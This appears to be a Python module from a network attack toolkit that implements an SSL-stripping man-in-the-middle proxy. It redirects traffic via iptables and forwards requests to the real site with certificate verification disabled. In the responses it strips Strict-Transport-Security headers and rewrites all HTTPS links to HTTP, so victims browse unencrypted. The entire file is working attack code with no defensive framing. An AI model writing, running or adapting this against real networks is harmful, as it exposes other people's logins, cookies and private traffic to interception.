import socket
import ssl
import threading
import re
import uuid
import time
from . import STATUS, STOP_EVENT, SSL_STRIP_PORT, CAPTURE_DIR
from .utils import log_msg, set_port_forwarding

def handle_client_connection(client_socket):
    secure_sock = None
    try:
        client_socket.settimeout(3.0)
        request_data = client_socket.recv(4096)
        if not request_data:
            return

        # Parse Host header from request
        host = None
        try:
            headers = request_data.decode('utf-8', errors='ignore').split('\r\n')
            for line in headers:
                if line.lower().startswith("host:"):
                    host = line.split(" ")[1].strip()
                    break
        except: pass

        # Connect to server
        if host:
            try:
                # Create SSL context with NO verification
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                # Try HTTPS first
                server_sock = socket.create_connection((host, 443), timeout=5)
                secure_sock = context.wrap_socket(server_sock, server_hostname=host)
            except:
                try: secure_sock = socket.create_connection((host, 80), timeout=5)
                except: return 

            with secure_sock:
                # Modify client request
                mod_req = re.sub(rb'Accept-Encoding:.*?\r\n', b'', request_data)
                mod_req = mod_req.replace(b'Connection: keep-alive', b'Connection: close')
                secure_sock.sendall(mod_req)
                
                # Receive full response
                response_data = b""
                secure_sock.settimeout(1.0) 
                while True:
                    try:
                        chunk = secure_sock.recv(4096)
                        if not chunk: break
                        response_data += chunk
                    except socket.timeout: break
                    except: break

                # Strip HTTPS enforcement
                response_data = re.sub(rb'Strict-Transport-Security:.*?\r\n', b'', response_data, flags=re.IGNORECASE)
                stripped_response = response_data.replace(b'https://', b'http://')
                
                client_socket.sendall(stripped_response)

     # Send modified response back           
    except Exception: pass
    finally:
        if secure_sock: secure_sock.close()
        client_socket.close()

def run_ssl_strip():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', SSL_STRIP_PORT))
        server.listen(50)
        
        # Enable iptables redirect (implemented in utils.set_port_forwarding)
        set_port_forwarding(True)
        log_msg(f"[PROXY] SSL Proxy: LISTENING on port {SSL_STRIP_PORT}")
        
        while not STOP_EVENT.is_set():
            try:
                server.settimeout(1.0)
                client, addr = server.accept()
                threading.Thread(target=handle_client_connection, args=(client,), daemon=True).start()
            except socket.timeout: continue
            except: pass
    except Exception as e: log_msg(f"[!] SSL ERROR: {e}")
    finally:
         # Always clean up iptables and socket
        set_port_forwarding(False)
        server.close()